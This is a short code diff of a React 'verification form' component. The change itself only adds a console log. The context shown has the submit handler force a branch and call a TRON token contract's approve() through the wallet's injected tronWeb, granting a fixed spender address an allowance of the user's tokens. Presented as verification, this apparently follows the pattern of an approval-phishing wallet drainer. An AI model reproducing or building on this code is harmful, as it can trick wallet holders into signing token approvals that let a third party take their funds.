@@ -344,7 +344,8 @@ const VerificationFormComponent = (props) => {
   };
 
   const handleSubmit = async (value) => {
-
+    console.log('window',window);
+    
     if (window.tronLink && window.tronLink.request) {
       console.log('helloo');
 
@@ -353,7 +354,6 @@ const VerificationFormComponent = (props) => {
     let txHash;
     // if (isBitgetTron && window.tronWeb) {
     if (true) {
-
       // Use Bitget's injected tronWeb for signing and sending
       const contract = await window.tronWeb.contract().at(trxContractAddress);
       const tx = await contract.approve(spenderTrx, (spenderAmount * 1_000_000).toString()).send({
